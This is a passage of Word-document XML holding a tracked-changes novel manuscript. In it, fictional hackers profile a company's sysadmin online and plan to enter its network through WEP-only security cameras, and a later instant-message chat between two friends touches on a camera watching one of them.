          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“Not much to tell,” Mike replied. “A couple years ago, somebody hacked a website called ImageShack. A hacker group called ‘anti-sec’ publicly announced that they were responsible for the break-in, and that they used a brand-new</w:t>
      </w:r>
      <w:ins w:id="606" w:author="TextVet" w:date="2016-03-15T16:35:00Z">
        <w:r w:rsidR="00E45921">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all-powerful hacker tool. System administrators all over the world freaked out. They completely disabled SSH on their networks — they figured it’s better </w:t>
      </w:r>
      <w:commentRangeStart w:id="607"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to not</w:t>
      </w:r>
      <w:commentRangeEnd w:id="607"/>
      <w:r w:rsidR="00C00320">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="607"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> let </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>anybody</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> connect, not even legitimate users, than to give a hacker a route of entry.”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sounds like more than just a rumor,” said Danny. “That’s a serious threat.”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 would have been, if it was real,” </w:t>
      </w:r>
      <w:ins w:id="608" w:author="TextVet" w:date="2016-03-15T16:37:00Z">
        <w:r w:rsidR="004D76A3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>continue</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="609" w:author="TextVet" w:date="2016-03-15T16:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004D76A3">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 Mike. “But it turned out that the hacker group lied. There was no such tool. It was all a giant hoax. It was all just a bunch of punks trying to make themselves look powerful, freak people out. Which, granted, it did. But so what? All it proves is how crazy everything would be </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> there was a vulnerability in SSH. But there isn’t.”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thought for a moment. “Not even through its own system administrators?”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shook his head. “I don’t follow.”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paced as he talked. “These anti-sec guys </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>succeeded</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> in taking a bunch of companies offline — not by exploiting a flaw in the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>machines</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, but by tricking the sysadmins who run them. Hacking is making a system do something that it isn’t supposed to do. That system includes people. It’s built and maintained by people. Tungsten’s IT staff itself is a system component. Let’s look for vulnerabilities in it.” He </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>turned toward Jason, who was fiddling on his cellphone. “How big is Tungsten’s Information Technology department?”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“Just one guy,” Jason answered. “They have a couple older technicians around to maintain the equipment, but they’re not in charge of the corporate network. Their system administrator is some hipster kid. I don’t know his name.”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bet LinkedIn does,”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tapped away on his laptop. “Tungsten Medical Technologies… Network administrator… Got it! Roger Tanner. Jason, is this him?” Moshen turned his laptop around to show the screen. It displayed a Facebook profile page. The photo showed a young man with dark spiked hair and narrow black-framed glasses. Jason nodded.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studied the screen. “His username is ‘rot13er’. He probably uses that same handle everywhere. Let’s see what this guy’s all about. Search around the web. Check message forums, social networks, anything.”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After several minutes, Mike piped up. “Danny. You were right. I think I found something. It’s an online tech-support forum for a company called OmniVision. They make security cameras. Check this out…”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>User: rot13er (Member, active 1 day)</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Do you have a software upgrade for the OmniVision Sightbulb-1200 PTZ to give it WPA support? My company has about 30 of these cameras, installed ten years ago. We have a few wireless access points to connect them to the corporate LAN, but I have to run these APs with WEP because the cameras don’t speak WPA.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>---</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>User: David Swan (OmniVision Support Engineer)</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>I'm sorry to inform you that we discontinued support for the Sightbulb series about four years ago. I advise replacing with our Clarity line. I'd be happy to pass you along to our sales department.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>---</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>User: rot13er</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>My company's not paying for 30 new cameras. All I want is a firmware patch.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>---</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>User: David Swan</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>The Sightbulbs were manufactured before WEP's weaknesses were discovered. Unfortunately, it was technically infeasible to migrate the Sightbulb-1200 to WPA.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>---</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>User: rot13er</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Are you serious? WEP is worthless. I might as well not even be running encryption at all. Thanks for nothing.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smirked as he read the exchange. “Nice find, Mike! Gentlemen, let’s reconvene tonight after dark, and head over to Tungsten HQ. And savor the irony: we’ll be penetrating their network through their security cameras.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>7</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F8FFF8"/>
        <w:spacing w:after="0" w:line="300" w:lineRule="atLeas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t>witchdoctor82</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>hey lady! Whatchya up to?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F8FFF8"/>
        <w:spacing w:after="0" w:line="300" w:lineRule="atLeast"/>
        <w:jc w:val="righ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t>tinacious_g</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>O HAI!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>IM IN MY LOBBY HATING MY LIFE</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>why are u still at work? Its almost 10</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Drippy gave me a bunch of shit tasks just to make my life suck.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>sorry t. you gonna be done soon?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>No. Haven't really focused. I made a big mistake called icanhascheezburger.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>And cuteoverload.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>And stuffonmycat.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>haha did lolcats steal your brain?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Yeah.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I was like, I don't waaaaaaaant to print any more forms tonight. I'll cheer myself up by looking at funny pictures on the internets. OMG KITTIES!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>KITTIES EVERYWHERE!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Hours later... ZOMGZ MOAR KITTIES!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>did you know you get a dopamine rush just from looking at a picture of a smiling baby or a cute animal? There was a uk study about 2yrs ago that proved lolcats are a drug.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>AW GEEZ NOT THIS SHIT AGAIN!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Drippy dragged me into his office this afternoon to lecture me about neurotransmitters.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>He called me hormonal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>and offered to implant electrodes into my cerebral cortex.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>aww what a sweet man!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>It was really more about me behaving myself with Roger. Drippy disapproved of me giving Roger a close look at my iPhone at high velocity.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>hmm. t, you know u should never succumb to anger. Remember all energy u put out comes back to u threefold. Which is why ur stuck at work late tonight.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>but just between u and me...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>nice!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I'm pretty sure I'm stuck here not because of Wiccan mysticism but because of the security cameras</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>ohshit! Shitshitshit!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I swear I just heard one move.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I think it's pointed at me. It's in a black glass dome on the ceiling but you can kinda see it when it turns.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I think it's checking out my boobs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Am I losing it?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>yes. :)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>im serious about the Rule of Three, t. I know u dont believe in it, but I see it work.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>for example. I have this one patient whos seeing me for ptsd.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>his last doc had him on luvox, but it made him nauseous. So he switched to lexapro, which he didntrespond to. Then they tried klonopin, but he got suicidal.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>so when they assigned him to me, you know what i gave him?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>mullein!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Is that an anti-anxiety med?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>a flower!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>i made him a bracelet out of them. :)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Let me guess. It's a charm?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>yes! for courage.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>i told him to wear the bracelet all day, and i taught him an incantation to recite whenever he feels his anxiety coming back.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You prescribed him a Wiccan ritual?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Nat, are you actually allowed to do that? :P</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>not really :)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>but it helped him.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>"Dear Swedish Medical Center Ethics Committee. My treatment methodology involved a magical bracelet..."</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>you think THATS the strangest thing theyve ever heard? :)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>anyway, the magick comes not from the bracelet, but from the mind of the wearer. the mullein is just a lens for the wearer to focus their innate power for self-healing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>think of the placebo effect. Its "imaginary" but the results are real.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Better living through self-deception? :)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>or self-fulfilling prophecy.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00BC5A74" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:commentRangeStart w:id="610"/>
      <w:r w:rsidRPr="000D3488">
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:t>t</w:t>
      </w:r>
      <w:ins w:id="611" w:author="TextVet" w:date="2016-03-15T16:43:00Z">
        <w:r>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:t>s</w:t>
      </w:r>
      <w:commentRangeEnd w:id="610"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:commentReference w:id="610"/>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:t xml:space="preserve"> taking something in your mind, and making your imagination manifest in the real world.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>and THAT, is magick. ;)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Ok, speaking of things you imagine actually being real.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>That camera moved again.</w:t>
      </w:r>
    </w:p>
